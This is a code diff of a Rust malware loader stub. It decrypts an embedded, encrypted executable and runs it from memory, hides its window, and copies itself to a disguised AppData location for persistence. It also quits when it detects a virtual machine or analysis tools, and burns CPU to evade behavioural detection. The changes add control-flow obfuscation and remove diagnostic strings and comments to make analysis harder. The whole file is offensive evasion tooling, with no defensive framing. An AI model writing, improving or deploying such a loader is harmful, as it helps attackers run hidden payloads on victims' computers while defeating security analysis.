@@ -1,61 +1,61 @@
-#![windows_subsystem = "windows"] // Uncomment to link as a GUI-subsystem PE (no console window) 
+#![windows_subsystem = "windows"]
+
 mod generated;
 mod persistence;
-use generated::{KEY, NONCE, DELAY_SECS, ANALYSIS_DETECTION , PERSISTENCE};
-use std::error::Error;
-use::std::time::{Duration, Instant};
+
+use generated::{KEY, NONCE, DELAY_SECS, ANALYSIS_DETECTION, PERSISTENCE};
+use std::time::{Duration, Instant};
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Key, Nonce,
 };
+use rust_code_obfuscator::{obfuscate_dummy_branch, obfuscate_flow};
 use std::convert::TryInto;
 use busywork::{BusyWork, Categories, Intensity};
 use rand::RngExt;
+
+/// Opaque error type. Intentionally has no Display/Debug text so no
+/// diagnostic string ever reaches the binary, stdout, or a crash dump.
+#[derive(Clone, Copy)]
+pub enum StubError {
+    EncryptionFailed,
+    DecompressionFailed,
+    ExecutionFailed,
+    PersistenceError,
+    UnexpectedError,
+}
+
+type StubResult<T> = Result<T, StubError>;
 
 // Encrypted + zstd-compressed target PE, embedded at compile time.
 static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
 
 fn analysis_detected() -> bool {
-    // WARNING: unreliable standalone analysis check. The crate's heuristics
-    // can be outdated, bypassed, or produce false negatives on modern or
-    // custom-configured environments.
-    //
-    // `antilysis::detected()` returns true if ANY of the following is found:
-    // - suspicious analysis processes (Wireshark, Procmon, pe-sieve, ...)
-    // - debugger processes (x64dbg, WinDbg, ollydbg, ...)
-    // - debugger APIs (IsDebuggerPresent, CheckRemoteDebuggerPresent, NTICE)
-    // - VM driver files (VMware, VirtualBox)
-    // - VM MAC address prefixes (00:05:69, 00:0C:29, 08:00:27, ...)
-    // - known sandbox artifacts
-    antilysis::detected().unwrap_or(false)
+    vmaware::VM::detect(None)
 }
 
-fn decompress() -> Result<Vec<u8>, std::io::Error> {
-    zstd::decode_all(ENCRYPTED)
+fn decompress() -> StubResult<Vec<u8>> {
+    zstd::decode_all(ENCRYPTED).map_err(|_| StubError::DecompressionFailed)
 }
 
-fn decrypt(ciphertext: &[u8]) -> Result<Vec<u8>, String> {
-    let key: &Key<Aes256Gcm> = (&KEY).try_into().map_err(|_| "invalid key length")?;
+fn decrypt(ciphertext: &[u8]) -> StubResult<Vec<u8>> {
+    let key: &Key<Aes256Gcm> = (&KEY).try_into().map_err(|_| StubError::EncryptionFailed)?;
     let cipher = Aes256Gcm::new(key);
-    let nonce: &Nonce<_> = (&NONCE).try_into().map_err(|_| "invalid nonce length")?;
-    let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| format!("AES-GCM decrypt failed: {:?}", e))?;
-
+    let nonce: &Nonce<_> = (&NONCE).try_into().map_err(|_| StubError::EncryptionFailed)?;
+    let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|_| StubError::EncryptionFailed)?;
     Ok(plaintext)
 }
 
-fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
-    let module = maple_rs::Maple::load_executable_from_memory(pe_bytes).map_err(|e| format!("Failed to load executable: {e}"))?;
-    module.execute_entry_point().map_err(|e| format!("Failed to execute entry point: {e}"))?;
+fn execute(pe_bytes: &[u8]) -> StubResult<()> {
+    let module = maple_rs::Maple::load_executable_from_memory(pe_bytes).map_err(|_| StubError::ExecutionFailed)?;
+    module.execute_entry_point().map_err(|_| StubError::ExecutionFailed)?;
     Ok(())
 }
 
-// Burn CPU/memory work for duration_secs instead of sleeping, to avoid
-// the static "idle then act" behavioral signature.
 fn behavior_misleading(duration_secs: u64) {
     let target = Duration::from_secs(duration_secs);
     let start = Instant::now();
     let worker = BusyWork::new(Intensity::Low).allow(Categories::NETWORK | Categories::WINAPI);
-
     while start.elapsed() < target {
         worker.run();
     }
@@ -67,36 +67,17 @@ fn delay_execution() {
     }
 }
 
-// ... (rest of the imports unchanged) ...
-
-fn run() -> Result<(), Box<dyn Error>> {
-    // ---------------------------------------------------------------
-    // Persistence bootstrap.
-    //
-    // On the first run, the stub copies itself to a masqueraded path
-    // under AppData, launches the copy, and exits. On subsequent runs
-    // (the copy), it detects that it is already in the target location
-    // and registers Phantom Persistence instead of copying again.
+fn run() -> StubResult<()> {
     if PERSISTENCE {
-        // ---------------------------------------------------------------
         if persistence::is_running_from_target() {
-            // We are the copy. Register for restart-on-shutdown.
             persistence::register_persistence();
         } else {
-            // First run. Install and launch the copy, then exit.
             if persistence::install_and_launch().is_ok() {
                 return Ok(());
             }
-            // If install failed (no APPDATA, permissions, etc.), fall through
-            // and run the payload normally. The stub still works, it just
-            // won't persist.
         }
     }
 
-
-    // ---------------------------------------------------------------
-    // Normal payload flow.
-    // ---------------------------------------------------------------
     delay_execution();
 
     if ANALYSIS_DETECTION && analysis_detected() {
@@ -104,16 +85,17 @@ fn run() -> Result<(), Box<dyn Error>> {
         return Ok(());
     }
 
-    let ciphertext = decompress().map_err(|e| format!("Failed to decompress payload: {e}"))?;
-    let pe_bytes = decrypt(&ciphertext).map_err(|_| "Failed to decrypt payload. The encrypted data may be corrupted or the key/nonce may be incorrect.")?;
-
+    let ciphertext = decompress()?;
+    let pe_bytes = decrypt(&ciphertext)?;
     execute(&pe_bytes)?;
 
     Ok(())
 }
 
 fn main() {
-    if let Err(_) = run() {
+    obfuscate_flow!(); // https://github.com/GianIac/rustfuscator
+    obfuscate_dummy_branch!(); // https://github.com/GianIac/rustfuscator
+    if run().is_err() {
         std::process::exit(1);
     }
 }
